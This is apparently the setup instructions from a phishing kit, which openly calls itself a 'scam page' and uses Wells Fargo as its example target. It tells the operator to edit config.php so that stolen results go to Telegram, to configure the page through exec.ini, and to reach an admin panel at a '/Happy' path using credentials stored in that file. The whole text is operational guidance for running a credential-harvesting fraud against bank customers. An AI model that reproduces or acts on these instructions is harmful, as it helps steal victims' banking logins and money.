
edit the config.php file to receive results on telegram 

edit the exec.ini to edit the scam page configuration.



you can find the admin panel in /Happy 

example : 
 if your scam page link is : www.domain.com/wellsfargo
 Your admin panel link will be : www.domain.com/wellsfargo/Happy/
 You can find admin panel credentials in exec.ini file 